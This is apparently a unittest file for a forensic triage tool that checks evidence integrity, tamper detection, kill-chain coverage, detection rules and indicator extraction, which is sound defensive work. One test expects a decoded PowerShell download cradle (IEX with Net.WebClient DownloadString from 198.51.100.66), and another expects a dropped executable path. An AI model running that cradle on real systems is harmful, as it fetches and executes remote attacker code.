"""python3 -m unittest discover -s tests -v"""
import json, shutil, sys, tempfile, unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import analyze_triage as at  # noqa: E402

EV = [ROOT / "evidence/WS-0102", ROOT / "evidence/FS01"]


class TriageTests(unittest.TestCase):
    r = at.analyze(EV)
    rules = {f["rule"] for f in r["findings"]}

    def test_integrity_verified(self):
        self.assertEqual(self.r["integrity"], {"WS-0102": [], "FS01": []})

    def test_tamper_detected(self):
        with tempfile.TemporaryDirectory() as d:
            c = Path(d) / "WS-0102"; shutil.copytree(EV[0], c)
            (c / "events.json").write_text("[]")
            self.assertTrue(at.verify(c))

    def test_full_kill_chain(self):
        for t in ("Initial Access", "Execution", "Persistence", "Credential Access", "Lateral Movement",
                  "Command and Control", "Impact"):
            self.assertGreater(self.r["kill_chain"][t], 0, t)

    def test_key_rules(self):
        for rid in ("DF-03", "DF-11", "DF-12", "DF-14", "DF-16", "DF-17", "DF-20", "DF-21", "DF-22", "DF-23", "DF-24"):
            self.assertIn(rid, self.rules, rid)

    def test_powershell_decoded(self):
        dec = [f["decoded"] for f in self.r["findings"] if f.get("decoded")]
        self.assertIn("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')", dec)

    def test_iocs(self):
        self.assertEqual(self.r["iocs"]["ipv4"], ["198.51.100.66"])
        self.assertIn(r"C:\Windows\Temp\lk.exe", self.r["iocs"]["path"])

    def test_no_false_positive_on_benign(self):
        ev = [e for e in self.r["findings"] if "OUTLOOK.EXE" == e["evidence"] or "intranet" in e["evidence"]]
        self.assertEqual(ev, [])
        defrag = [f for f in self.r["findings"] if "Defrag" in f["title"]]
        self.assertEqual(defrag, [])

    def test_external_ip_logic(self):
        self.assertTrue(at.is_external("198.51.100.66"))
        self.assertFalse(at.is_external("10.10.5.20"))

    def test_report_written(self):
        with tempfile.TemporaryDirectory() as d:
            at.write(self.r, Path(d))
            self.assertIn("Decoded", (Path(d) / "triage_findings.md").read_text())
            self.assertGreater(len((Path(d) / "super_timeline.csv").read_text().splitlines()), 20)


if __name__ == "__main__":
    unittest.main()
